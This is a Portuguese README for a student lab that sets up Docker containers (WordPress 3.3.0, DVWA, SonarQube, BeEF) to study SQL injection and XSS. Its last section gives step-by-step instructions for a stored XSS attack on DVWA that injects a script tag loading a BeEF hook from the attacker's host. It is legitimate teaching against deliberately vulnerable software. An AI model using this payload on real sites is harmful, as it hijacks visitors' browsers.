# 41ASO-SegInfo
Estudo sobre ataques de SQLi e XSS com PoC em sqlmap e BeeF. Turma `41ASO`, disciplina `ARCHITECTURE FOR MASTERING STRATEGIC AND EMERGING TECHNOLOGY INNOVATION`, professor `Ricardo Giorgi`.

## Pré-requisito
- [Docker](https://docs.docker.com/get-docker/)
- [Docker Compose](https://docs.docker.com/compose/install/)

## WordPress
Foi criado um container de WordPress na versão 3.3.0, obtido através da referência [WordPress Releases](https://wordpress.org/download/releases/).
wget https://wordpress.org/wordpress-3.3.zip

Para construir a imagem do container de WordPress 3.3.0, é necessário realizar o comando `docker-compose build wordpress`.

Para executar o sistema WordPress, é necessário realizar os seguintes comandos:
```
docker-compose up -d db
docker-compose up -d wordpress
```
Enquanto o container de MariaDB não finalizar sua inicialização, o container do WordPress ficará restartando.

Realizamos o backup do diretório `/var/www/html/`, localizado em `wordpress/site/`, onde efetuamos a montagem desse diretório para o container, a fim de disponibilizar o ambiente preparado para o estudo.

Também realizamos o backup da base de dados `wordpress`, localizado em `wordpress\wordpress.sql`, onde efetuamos a montagem desse arquivo no container de MariaDB, para que seja carregado para o MariaDB durante sua primeira inicialização, trazendo todas as configurações realizadas no WordPress.

Exemplo de comando para realização do backup da base de dados:
```
mysqldump -u admin -padmin --quick --extended-insert wordpress > wordpress.sql
```

### Credenciais WordPress
- Home: `http://127.0.0.1:8889/`
- Página de login: `http://127.0.0.1:8889/wp-login.php`
- Usuário: `admin`
- Senha: `admin`

### Credenciais Base de Dados WordPress
- Host: `db`
- Usuário: `admin`
- Senha: `admin`
- Database: `wordpress`

## DVWA
Para auxiliar no estudo, configuramos um container de DVWA.

Para executar o container do sistema DVWA, é necessário realizar o seguinte comando:
```
docker-compose up -d dvwa
```

Para interagir com o sistema, acessar a URL `http://127.0.0.1:8888/`. Segue referência do [código-fonte](https://github.com/ethicalhack3r/DVWA).

### Credenciais DVWA
- Usuário: `admin`
- Senha: `password`

## SonarQube
Para auxiliar no estudo, configuramos um container de SonarQube, a fim de escanear códigos-fonte, na tentativa de identificação de vulnerabilidades.

Para executar o container do sistema DVWA, é necessário realizar o seguinte comando:
```
docker-compose up -d sonarqube
```
Pode demorar alguns minutos para terminar de inicializar o sistema.

Para interagir com o sistema, acessar a URL `http://127.0.0.1:9000/`.

### Credenciais SonarQube
- Usuário: `admin`
- Senha: `admin`

## SonarQube Scan
Container responsável por escanear os códigos-fonte dos sistemas alvo, e reportar ao SonarQube.

Para construir a imagem do container de scan, é necessário realizar o comando `docker-compose build sonar-scan`.

Garantir que o container do SonarQube está funcionando. Logar no site do container para validar, conforme instruções descritas acima.

Para realizar o scan dos sistemas DVWA e WordPress 3.3.0, realizar o seguinte comando:
```
docker-compose run sonar-scan
```

Para entrar no container de scan, realizar o seguinte comando:
```
docker-compose run sonar-scan bash
```

## Attack
Container contendo ferramentas para ataque dos sistemas alvo.

Para construir a imagem do container de ataque, é necessário realizar o comando `docker-compose build attack`. A construção da imagem é demorada, devido à instalação do framework BeEF.

Para entrar no container de ataque, realizar o seguinte comando:
```
docker-compose run attack bash
```

Para executar a framework BeEF, é necessário realizar os seguintes comandos:
```
docker-compose run attack bash
cd /opt/beef
./beef
```

Adicionalmente, pode-se executar outro `bash` no mesmo container. Para isso, primeiramente obter o nome do container em execução:
```
docker-compose ps
```
Resultando na seguinte saída de exemplo:
```
                Name                               Command               State           Ports
-------------------------------------------------------------------------------------------------------
41aso-seginfo_attack_run_c58f5649e3a3   bash                             Up
```
Agora basta executar o comando `docker exec -it 41aso-seginfo_attack_run_c58f5649e3a3 bash`.

### Credenciais BeEF
- Usuário: `beef`
- Senha: `feeb`

## Realizar ataque com BeEF
Primeiramente, precisaremos conectar na SDN Docker. Para isso, utilizaremos o mitmproxy. Executar o seguinte comando:
```
docker-compose up -d mitmproxy
```

Configurar o proxy da sua máquina ou navegador, para apontar para o IP do host Docker, na porta 8080.
Exemplo em Windows, com Docker Desktop:
```
Painel de Controle\Rede e Internet\Central de Rede e Compartilhamento -> Opções da Internet -> Aba "Conexões" -> Configurações da LAN -> Servidor proxy:
Endereço: 127.0.0.1
Porta: 8080
OK
```

Executar o BeEF e o DVWA. Após executar o BeEF, ele irá te indicar a URL `Hook URL`, com o IP da SDN Docker, onde deveremos copiar essa URL, para compor o código de injeção XSS. Exemplo de URL: `http://10.60.80.100:3000/hook.js`. Exemplo de código de injeção XSS: 
```html
<script src="http://10.60.80.100:3000/hook.js"></script>
```

Acessar o DVWA na URL [http://dvwa/login.php](http://dvwa/login.php) e efetuar o login. Selecionar o item `XSS (Stored)` do menu lateral. Essa página é responsável por listar mensagens enviadas pelos usuários, onde é possível preencher seu nome e a mensagem que deseja enviar. É uma página vulnerável ao ataque do tipo XSS, onde seguiremos os seguintes passos para executar o ataque:
- No campo de texto do `Message`, clicar com botão direito e inspecionar o elemento HTML. Deve aparecer o seguinte código:
```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea>
```
Aumentar o maxlength para que possamos injetar todo o código necessário:
```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="500"></textarea>
```
- No campo `Name`, preencher com qualquer informação: `HelloBeEF`.
- No campo `Message`, preencher com o código de injeção gerado:
```html
<script src="http://10.60.80.100:3000/hook.js"></script>
````
- Pressionar o botão `Sign Guestbook`

Toda vez que essa página for acessada, como ela lista as mensagens enviadas, e na última mensagem enviada, contém um código XSS injetado, automaticamente seremos redirecionados à página do BeEF.
